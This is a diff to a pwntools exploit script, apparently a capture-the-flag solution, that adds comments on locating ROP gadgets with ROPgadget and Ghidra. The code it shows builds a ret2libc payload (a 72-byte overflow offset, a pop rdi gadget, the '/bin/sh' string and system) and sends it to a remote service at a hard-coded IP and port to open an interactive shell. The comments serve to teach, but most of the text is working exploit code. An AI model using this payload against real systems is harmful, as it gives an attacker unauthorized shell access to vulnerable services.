@@ -9,6 +9,16 @@ p = remote('64.227.39.88', 30177)
 
 offset = b'A'*72
 
+# Use ROPgadget to find the addresses we need.
+# Use ghidra to look at the code and find out what
+# registers we need to search for, here it is rdi.
+# Then we can use rop to find the correct gadget
+# for the bit of code we want, so we get the address
+# for use in the payload.
+#
+# For more information, look up assembly gadgets
+# and return orientated programming
+
 rop = ROP([exe])
 pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
 ret = rop.find_gadget(['ret'])[0]
@@ -61,7 +71,7 @@ binsh = libc_base + binsh_offset
 # Set payload
 payload = offset + p64(pop_rdi) + p64(binsh) + p64(system)
 
-
+# Send payload
 # gdb.attach(p, gdbscript='i f')
 p.sendlineafter(b'dah?\n', payload)
 p.interactive()
